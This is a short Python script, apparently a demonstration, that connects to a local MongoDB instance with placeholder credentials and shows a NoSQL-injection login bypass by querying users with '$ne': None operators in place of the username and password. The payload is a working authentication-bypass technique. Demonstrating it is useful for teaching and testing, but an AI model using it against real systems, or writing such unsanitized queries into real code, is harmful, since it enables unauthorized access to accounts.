from pymongo import MongoClient
 
# Replace with your credentials and hostname
username = "admin"
password = "my-secret-pw"
host = "localhost"
port = 27017
auth_db = "admin"  # The database that holds the user's credentials
 
# Create URI
uri = f"mongodb://{username}:{password}@{host}:{port}/{auth_db}"
 
# Connect to MongoDB
client = MongoClient(uri)
 
# Select the database you want to use
db = client[auth_db]

users = db.users
 
# Setup: insert a new user
users.insert_one({"username": "admincopy", "password": "secret"})
 
# Simulated user input - Injection, this should find all users
user_input = {
    "username": {"$ne": None},
    "password": {"$ne": None}
}
 
user = users.find_one(user_input)
 
if user:
    print("Login bypassed! Found user:", user)
else:
    print("Login failed.")
 
client.close()